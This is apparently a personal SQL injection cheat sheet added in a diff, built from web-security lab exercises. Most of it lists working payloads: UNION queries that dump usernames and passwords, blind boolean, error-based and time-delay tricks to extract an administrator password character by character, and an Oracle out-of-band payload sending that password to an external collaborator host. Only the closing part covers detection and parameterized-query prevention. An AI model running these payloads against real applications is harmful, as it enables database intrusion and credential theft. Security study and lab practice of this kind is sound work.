@@ -1,0 +1,152 @@
+Most vulnerable area
+--------------------
+
+Update
+Select
+Insert
+Order By
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+UNION SELECT username || '~' || password FROM users
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SQL Cheatsheet
+--------------
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Figuring columns
+----------------
+Error start
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+etc.
+------------------
+No error
+
+' UNION SELECT NULL-- 
+' UNION SELECT NULL,NULL--  
+' UNION SELECT NULL,NULL,NULL--
+etc.
+ORACLE 
+' UNION SELECT NULL FROM DUAL--
+
+' UNION SELECT NULL,NULL FROM DUAL--
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+MYSQL
+
+' ORDER BY 2--                                                                                        ||To find No.of columns
+' UNION SELECT NULL,NULL--                                                                            ||To check column type
+' UNION SELECT NULL,'xxxx'--                                                                          ||To check column type
+' UNION SELECT database(),@@version#                                                                  ||To execute default variables
+' UNION SELECT table_name, NULL FROM information_schema.tables----                                    ||Table info from databases
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_lomcmx'--    ||Columns in Tables
+' UNION SELECT username_panckt, password_hwnlpc FROM users_lomcmx--                                   || Data in rows of columns in table 
+' UNION SELECT NULL, username || '~' || password FROM users--                                         || String Concodinator
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ORACLE
+
+' ORDER BY 2--                                                                                        ||To find No.of columns
+' UNION SELECT NULL,NULL FROM DUAL--                                                                  ||To check column type
+' UNION SELECT 'abc',BANNER FROM v$version--                                                          ||To execute default variables
+' UNION SELECT table_name, NULL FROM all_tables--                                                     ||Table info from databases
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_WJYGOR'--                ||Columns in Tables
+' UNION SELECT USERNAME_TWJRZF, PASSWORD_IIBKDG FROM USERS_WJYGOR--                                   || Data in rows of columns in table 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+MYSQL
+
+BLIND SQL WITH CONDITIONAL RESPONSE
+Fetching data(username/password) using blind SQL with Welcome back keyword on cookie:TrackingID
+
+…xyz' AND '1'='1                                                                             || To find Blind sql
+…xyz' AND '1'='2                                                                             || To find Blind sql
+' OR (SELECT 'a' FROM users LIMIT 1)='a                                                      || To check there is a users table
+' OR (SELECT 'a' FROM users WHERE username='administrator')='a                               || To find user administrator is present
+' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a        || To find length of the Password
+' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a           || To find password with character match  || change (=) to (< or >) || change (AND) to (OR)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ORACLE
+
+BLIND SQLI With no Response
+While playing with webpage, We identified if SQL query is wrong it triggers Internal serval error, IF SQL Query is CORRECT then 200OK But NO response from injected SQL Query
+
+' || (SQL QUERY)                                                                  || Concodinated query
+'||(SELECT '')||'                                                                 || Valid SQL Query || Mysql
+'||(SELECT '' FROM dual)||'                                                       || Valid SQL Query || ORACLE
+'||(SELECT '' FROM not-a-real-table)||'                                           || Crosscheck with invalid ORACLE Query
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'                                     || To check there is a users table  || Rownum 1 is important to prevent our query with unwanted errors
+
+FROM HERE WE FOUND That it is oracle database and we need to use CASE to figure out user(data) further
+
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'                                  || This query only show error if query is possitive, In this case only reflect error if user administrator is present
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>50) ||'         || To find length of the Password
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password,1,1)='a') ||'    || To find password with character match  || change (=) to (< or >)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Exploting blind sql injection by triggering TIME DELAY
+
+The results of the SQL query are not returned   || No union attack will work
+And the application does not respond any differently based on whether the query returns any rows or causes an error  || No errors or conditional errors
+
+PostgreSQL
+
+'; IF (1=2) WAITFOR DELAY '0:0:10'--          || This will wont delay, Because 1=2 is false
+'; IF (1=1) WAITFOR DELAY '0:0:10'--          || This will delay, Because 1=1 is true
+' || (SELECT pg_sleep(10))--                   || Postgresql time delay
+' || (SELECT sleep(10))--                      || MYSQL time delay
+' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--                                                           || To find information retrivel query is working or not 
+' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--                           || To find username 
+' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--     || To find length of the password
+' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--  || To fuzz password
+' || (select case when (username='administrator' and password='hrlgajcssh199lf8kdvx') then pg_sleep(10) else pg_sleep(-1) end from users)--  || To crosscheck password
+
+MSSQL
+
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Exploting blind sql injection by triggering Out-of-band interaction
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://zdg6jqq0rzrrfd1mrd1v5d8wcnil6a.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--                                                                                                                       || used to send DNS request using Oracle SQL Query
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.ke2xnd9zl34szguy5k4rvj87uy0soh.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--           || used to exfiltarate data to DNS request using Oracle SQL Query
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+How to detect SQL injection vulnerabilities
+
+The majority of SQL injection vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.
+SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. 
+
+This typically involves:
+    Submitting the single quote character ' and looking for errors or other anomalies.
+    Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application     responses.
+    Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.
+    Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
+    Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SQL injection in different parts of the query
+
+Most SQL injection vulnerabilities arise within the WHERE clause of a SELECT query. This type of SQL injection is generally well-understood by experienced testers.
+But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are:
+
+    In UPDATE statements, within the updated values or the WHERE clause.
+    In INSERT statements, within the inserted values.
+    In SELECT statements, within the table or column name.
+    In SELECT statements, within the ORDER BY clause.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+How to prevent SQL injection
+
+Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.
+The following code is vulnerable to SQL injection because the user input is concatenated directly into the query: 
+
+String query = "SELECT * FROM products WHERE category = '"+ input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query)
+
+This code can be easily rewritten in a way that prevents the user input from interfering with the query structure: 
+
+PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();
+
+Parameterized queries can be used for any situation where untrusted input appears as data within the query, including the WHERE clause and values in an INSERT or UPDATE statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the ORDER BY clause. Application functionality that places untrusted data into those parts of the query will need to take a different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior.
+
+For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted. 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
